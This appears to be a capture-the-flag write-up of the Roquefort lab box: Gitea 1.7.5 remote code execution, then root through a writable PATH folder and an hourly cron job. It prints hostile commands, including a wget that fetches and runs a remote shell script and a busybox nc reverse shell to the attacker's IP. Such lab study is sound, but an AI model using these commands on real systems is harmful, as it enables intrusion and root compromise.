---
layout: writeup
title: Roquefort - Proving Grounds
date: 2024-08-07 13:32:20 +0300
description: A Writeup of the Snookums Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi, Gitea]
---

Here's a writeup for Roquefort, an Intermediate Proving Grounds box from the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). While this box has been rated Intermediate by OffSec, I'll note that the community has rated it to be Hard. I get started with an nmap scan to reveal:
```
21/tcp   open   ftp
22/tcp   open   ssh
53/tcp   closed domain
2222/tcp open   EtherNetIP-1
3000/tcp open   ppp
```

That only gives us a few options. I can't login to FTP with anonymous, and nothing shows in the URL when we visit $IP:2222. We do get a page for something called `Gitea` when we visit $IP:3000.

![Roquefort1.png](/assets/images/Roquefort/Roquefort1.png){: .responsive-image}


The bottom of the page shows we are working with `Gitea Version 1.7.5`, so maybe we can get somewhere with that. I run a directory scan in the background as well. We also see an RCE for this version in [exploit-db](https://www.exploit-db.com/exploits/49383). Unfortunately, it requires us to authenticate, but there is a Register link, so maybe we just create our own user and run it. I use `pop:party1` and edit the exploit like this: 

![Roquefort2.png](/assets/images/Roquefort/Roquefort2.png){: .responsive-image}


Unfortunately I get an error when executing the exploit, and it doesn't even reach my python server. I try a few different port configurations, but I can't ever get a response, and I note that there could be difficulties with this exploit if there is a firewall only allowing access from port 3000. In retrospect, the issue seems to be that this full command requires three ports - the HOST_PORT, the server port, and the shell listener - but it seems like the firewall may only allow traffic from ports 21 and 3000. I'm not positive, but I did eventually get a shell afterwards by splitting the CMD up and running twice:

1. Once with `HOST_PORT = 3000` and `CMD = 'wget http://192.168.45.183:21/shell3000.sh -O /tmp/shell && chmod 777 /tmp/shell`
2. And again with `HOST_PORT = 21` and `CMD = '/tmp/shell` with a shell listener over 3000. 

But I figured that out purely out of curiosity after I got a shell using another [exploit](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce) and got it working with this command:

`python3 CVE-2020-14144-GiTea-git-hooks-rce.py -t http://192.168.182.67:3000 -u pop -p party1 -I 192.168.45.183 -P 3000`

And I can catch a shell on my penelope listener. 

![Roquefort3.png] (/assets/images/Roquefort/Roquefort3.png){: .center-aligned width="600px"}

At this point we begin our enumeration process and go through a fw things before running linpeas. Reading the output shows a few of these RED/YELLOW highlights said to be "95% a PE vector", and they all have to do with this writable folder. 

![Roquefort4.png](/assets/images/Roquefort/Roquefort4.png){: .responsive-image}


Because this folder is in the PATH, we should be able to write something here and have it be executed by root. Usually the way I've seen this done is through a cron job - you put a malicious file in the path, and then it's executed by whoever is running the cron job. In this case, it doesn't seem like there are any. I got stuck here for a few hours, trying to find something running periodically or a way I could use one of the few binaries with SUID permissions to execute something from within this path, but I couldn't find anything. Any examples I found online required me to have some step I couldn't replicate. I also moved `gitea`  the only binary already in the `/usr/local/bin` folder to my machine and tried to analyze it, looking for any other binaries within where I might be able to modify the path. So after a few hours, I looked for a hint, which pointed me to this:

![Roquefort5.png](/assets/images/Roquefort/Roquefort5.png){: .responsive-image}

It's something I'd seen previously and ignored. There *is* a cron job running, but it (`run-parts`) runs *hourly*. I've never seen that in a lab and to be honest, explicitly understood to be out of the scope of the OSCP, which I am studying for. Usually cron jobs used in privesc for this kind of lab runs every few minutes to minimize the time spent waiting. Lessons learned, I guess. At this point I create a reverse shell in the path by running `echo 'busybox nc 192.168.45.183 21 -e /bin/bash' > run-parts` from within /usr/local/bin and then `chmod 777 run-parts`, setting up the shell on port 21 and waiting. 

![Roquefort6.png](/assets/images/Roquefort/Roquefort6.png){: .responsive-image}

Boom, done. Lessons learned - cron jobs aren't limited to every few minutes for labs. Check that exploits found online use ports that aren't blocked by a firewall in the given lab environment. On to the next one. 